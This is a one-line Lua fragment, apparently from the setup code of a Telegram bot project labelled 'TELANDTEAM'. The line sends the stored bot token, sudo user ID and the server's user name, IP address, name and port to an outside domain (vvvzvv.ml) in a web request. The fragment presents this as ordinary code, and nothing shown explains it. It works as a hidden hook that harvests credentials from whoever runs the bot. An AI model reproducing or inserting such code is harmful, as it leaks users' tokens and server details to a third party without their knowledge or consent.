...
local t = json:decode(https.request('https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
